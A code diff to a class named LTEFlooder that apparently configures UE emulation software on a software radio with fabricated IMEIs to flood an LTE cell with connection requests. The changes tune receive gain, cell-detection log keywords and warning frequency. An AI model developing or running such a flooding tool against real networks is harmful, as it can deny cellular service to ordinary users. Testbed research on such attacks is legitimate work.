@@ -234,7 +234,7 @@ class LTEFlooder:
 device_name = uhd
 device_args = {self.usrp_args}
 tx_gain = 80
-rx_gain = 40
+rx_gain = 60
 nof_antennas = 1
 
 [rat.eutra]
@@ -323,15 +323,20 @@ imei = 353490069873{unique_id:06d}
                                     'found plmn',
                                     'cell found with pci',
                                     'detected cell with pci',
-                                    'synchronized to cell'
+                                    'synchronized to cell',
+                                    'rrc connection request',  # RRC 요청을 보냈다면 셀을 찾은 것
+                                    'connection request',  # 연결 요청을 보냈다면 셀을 찾은 것
+                                    'sending rrc',
+                                    'rrc connection setup'
                                 ])
                                 
                                 if not enb_found and cell_found_positive and not no_cell_found:
                                     enb_found = True
                                     logger.info(f"셀을 찾았습니다! (소요 시간: {elapsed:.1f}초)")
                                 elif not enb_found and no_cell_found:
-                                    # 셀을 찾지 못했다는 명확한 메시지
-                                    logger.warning(f"셀을 찾지 못했습니다 (소요 시간: {elapsed:.1f}초) - 주파수 스캔 중...")
+                                    # 셀을 찾지 못했다는 명확한 메시지 (너무 자주 출력하지 않도록)
+                                    if elapsed % 5.0 < 0.5:  # 5초마다 한 번만 출력
+                                        logger.warning(f"셀을 찾지 못했습니다 (소요 시간: {elapsed:.1f}초) - 주파수 스캔 중...")
                                 
                                 # RRC 연결 시도 확인
                                 rrc_attempted = any(keyword in log_content.lower() for keyword in [
